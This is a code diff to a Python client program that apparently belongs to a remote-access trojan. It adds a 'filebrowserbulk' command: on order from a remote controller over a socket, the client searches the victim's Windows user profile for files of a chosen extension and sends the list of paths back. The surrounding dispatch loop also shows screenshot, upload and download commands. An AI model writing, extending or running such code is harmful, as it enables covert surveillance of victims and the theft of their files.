@@ -143,6 +143,23 @@ def file_browser():
         objSocket.send(str.encode("Invalid Directory!"))
         return
 
+def file_browser_bulk():
+    
+    strExt = objSocket.recv(1024).decode("utf-8")
+    pathUser = os.path.expandvars("%userprofile%")
+    strFiles = ""
+    for root, dirs, files in os.walk(pathUser):
+        for file in files:
+            if file.lower().endswith(strExt) and root.count(os.sep) < 6:
+                 fPath = os.path.join(root, file)
+                 strFiles += (fPath + "\n")
+
+    objSocket.send(str.encode(str(len(strFiles))))  # send buffer size
+    time.sleep(0.1)
+    objSocket.send(str.encode(strFiles))
+
+    return
+
 
 def upload(data):
     intBuffer = int(data)
@@ -362,6 +379,8 @@ try:
             screenshot()
         elif strData == "filebrowser":
             file_browser()
+        elif strData == "filebrowserbulk":
+            file_browser_bulk()
         elif strData[:4] == "send":
             upload(strData[4:len(strData)])
         elif strData[:4] == "recv":
